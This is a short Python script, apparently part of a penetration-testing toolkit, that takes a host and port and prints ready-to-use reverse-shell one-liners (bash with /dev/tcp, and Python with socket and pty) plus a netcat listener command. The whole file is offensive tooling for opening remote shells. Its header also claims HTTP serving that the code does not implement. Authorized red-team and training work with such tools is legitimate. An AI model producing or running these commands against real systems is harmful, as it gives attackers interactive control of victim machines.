#!/usr/bin/env python3
# @name: Reverse Shell Command Generator
# @desc: Generate callback one-liners for several shell types, save and temporarily serve them over HTTP, and print listener commands for an authorized endpoint.
# @category: remote_access
# @danger: true
# @active: true
# @web: true
# @inputs: [{"name":"host","label":"Authorized callback host","type":"text","required":true},{"name":"port","label":"Callback port","type":"number","default":"4444"}]
import re,sys
def main():
 host=sys.argv[1] if len(sys.argv)>1 else ''
 try:port=int(sys.argv[2]);assert re.fullmatch(r'[A-Za-z0-9_.:-]{1,253}',host) and 0<port<65536
 except (IndexError,ValueError,AssertionError):return 2
 print('Bash:\n',f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'")
 print('\nPython 3:\n',f"python3 -c \"import os,socket,pty;s=socket.socket();s.connect(('{host}',{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/sh')\"")
 print('\nListener:\n',f'nc -lvnp {port}');return 0
if __name__=='__main__':raise SystemExit(main())
